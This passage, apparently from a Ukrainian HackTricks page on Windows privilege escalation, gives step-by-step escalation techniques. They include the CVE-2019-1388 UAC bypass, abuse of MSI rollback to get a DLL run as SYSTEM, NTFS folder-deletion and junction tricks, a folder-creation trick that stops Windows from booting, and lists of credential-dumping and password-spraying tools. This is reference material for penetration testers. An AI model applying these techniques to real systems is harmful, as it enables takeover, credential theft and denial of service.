Це дозволяє підвищити привілеї та обійти UAC одночасно, використовуючи ту саму вразливість. Додатково, немає потреби нічого встановлювати, і бінарний файл, що використовується під час процесу, підписаний і випущений Microsoft.

Деякі з уражених систем наведені нижче:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Щоб експлуатувати цю вразливість, необхідно виконати такі кроки:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
У вас є всі необхідні файли та інформація в наступному репозиторії GitHub:

https://github.com/jas502n/CVE-2019-1388

## Від рівня Administrator Medium до High Integrity Level / UAC Bypass

Прочитайте це, щоб **ознайомитися з Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Потім **прочитайте це, щоб дізнатися про UAC та UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Від Arbitrary Folder Delete/Move/Rename до SYSTEM EoP

Техніка, описана [**в цьому дописі в блозі**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) з кодом експлойта [**доступним тут**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Атака по суті полягає в зловживанні функцією rollback Windows Installer для заміни легітимних файлів на шкідливі під час процесу деінсталяції. Для цього зловмиснику потрібно створити **malicious MSI installer**, який буде використано для перехоплення папки `C:\Config.Msi`, яка пізніше буде використовуватися Windows Installer для зберігання rollback-файлів під час деінсталяції інших MSI-пакетів, де файли rollback були б змінені, щоб містити шкідливе навантаження.

Стислий опис техніки такий:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Бум**: Ваш код виконується **як SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Основна MSI rollback-техніка (попередня) припускає, що ви можете видалити **цілу папку** (наприклад, `C:\Config.Msi`). Але що якщо ваша вразливість дозволяє лише **arbitrary file deletion**?

Ви могли б використати **внутрішні механізми NTFS**: кожна папка має прихований альтернативний потік даних, який називається:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Цей потік зберігає **індексні метадані** папки.

Отже, якщо ви **видалите потік `::$INDEX_ALLOCATION`** папки, NTFS **видалить всю папку** з файлової системи.

Ви можете зробити це, використовуючи стандартні API видалення файлів, наприклад:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Навіть якщо ви викликаєте *file* delete API, воно **видаляє саму папку**.

### Від Folder Contents Delete до SYSTEM EoP
Що робити, якщо ваш примітив не дозволяє видаляти довільні файли/папки, але він **дозволяє видаляти *вміст* папки, контрольованої атакуючим**?

1. Крок 1: Підготуйте приманку — папку та файл
- Створіть: `C:\temp\folder1`
- Всередині: `C:\temp\folder1\file1.txt`

2. Крок 2: Розмістіть **oplock** на `file1.txt`
- oplock **призупиняє виконання**, коли привілейований процес намагається видалити `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Крок 3: Запустіть процес SYSTEM (наприклад, `SilentCleanup`)
- Цей процес сканує папки (наприклад, `%TEMP%`) і намагається видалити їх вміст.
- Коли він доходить до `file1.txt`, **oplock спрацьовує** і передає контроль вашому callback.

4. Крок 4: Всередині oplock callback – перенаправте видалення

- Варіант A: Перемістіть `file1.txt` в інше місце
- Це очищає `folder1` без порушення oplock.
- Не видаляйте `file1.txt` безпосередньо — це передчасно звільнить oplock.

- Варіант B: Перетворіть `folder1` в **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Варіант C: Створити **symlink** у `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Це націлене на внутрішній потік NTFS, який зберігає метадані папки — його видалення видаляє папку.

5. Крок 5: Звільніть oplock
- Процес SYSTEM продовжує і намагається видалити `file1.txt`.
- Але тепер, через junction + symlink, він насправді видаляє:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Результат**: `C:\Config.Msi` видаляється користувачем SYSTEM.

### Від Arbitrary Folder Create до постійного DoS

Скористайтеся примітивом, який дозволяє вам **create an arbitrary folder as SYSTEM/admin** — навіть якщо **ви не можете записувати файли** або **встановлювати слабкі дозволи**.

Створіть **папку** (не файл) з ім'ям **критичного драйвера Windows**, наприклад:
```
C:\Windows\System32\cng.sys
```
- Цей шлях зазвичай відповідає драйверу режиму ядра `cng.sys`.
- Якщо ви **попередньо створите його як папку**, Windows не зможе завантажити фактичний драйвер під час завантаження.
- Потім Windows намагається завантажити `cng.sys` під час завантаження.
- Вона бачить папку, **не може розпізнати фактичний драйвер**, і **аварійно завершує роботу або зупиняє завантаження**.
- Немає **резервного варіанту**, і **відновлення неможливе** без зовнішнього втручання (наприклад, ремонт завантаження або доступ до диска).


## **Від High Integrity до SYSTEM**

### **Нова служба**

Якщо ви вже працюєте в процесі High Integrity, **шлях до SYSTEM** може бути простим — просто **створіть і запустіть нову службу**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Під час створення бінарного файлу служби переконайтеся, що це дійсна служба або що бінарний файл виконує необхідні дії швидко, оскільки він буде завершений через 20 с, якщо це не дійсна служба.

### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Ви можете** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Якщо у вас є ці токен-привілеї (ймовірно, ви знайдете їх у процесі High Integrity), ви зможете **відкрити майже будь-який процес** (не захищені процеси) з привілеєм SeDebug, **скопіювати токен** цього процесу та створити **довільний процес з цим токеном**.\
За допомогою цієї техніки зазвичай **вибирають будь-який процес, що працює як SYSTEM із усіма токен-привілеями** (_так, ви можете знайти SYSTEM процеси без усіх токен-привілеїв_).\
**Ви можете знайти** [**приклад коду, що виконує запропоновану техніку тут**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client (the service) obtaining SYSTEM privileges.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Якщо вам вдасться **hijack a dll**, що **завантажується** процесом, який працює як **SYSTEM**, ви зможете виконати довільний код з цими привілеями. Тому Dll Hijacking також корисний для такого типу ескалації привілеїв і, крім того, значно **легше досягається з процесу High Integrity**, оскільки він матиме **write permissions** у папках, що використовуються для завантаження dll.\
**Ви можете** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Читайте:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Додаткова допомога

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Корисні інструменти

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевіряє на misconfigurations та чутливі файли (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевіряє можливі misconfigurations та збирає інформацію (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевірка на misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Дістає збережені сесії PuTTY, WinSCP, SuperPuTTY, FileZilla та RDP. Використовуйте -Thorough локально.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Дістає облікові дані з Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Розбризкує зібрані паролі по домену**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh — PowerShell ADIDNS/LLMNR/mDNS/NBNS спуфер та man-in-the-middle інструмент.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Базова Windows енума для privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Пошук відомих privesc вразливостей (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(Потребує прав Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Пошук відомих privesc вразливостей (потрібно компілювати через VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перераховує хост у пошуках misconfigurations (більше інструмент для збору інформації ніж для privesc) (потрібно компілювати) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Дістає облікові дані з багатьох програм (precompiled exe в github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Порт PowerUp на C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Перевірка на misconfiguration (виконуваний файл precompiled в github). Не рекомендовано. Погано працює в Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевірка можливих misconfigurations (exe з python). Не рекомендовано. Погано працює в Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Інструмент створений на основі цього посту (не потребує accesschk для коректної роботи, але може його використовувати).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Читає вивід **systeminfo** і рекомендує працюючі експлойти (локальний python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Читає вивід **systeminfo** і рекомендує працюючі експлойти (локальний python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
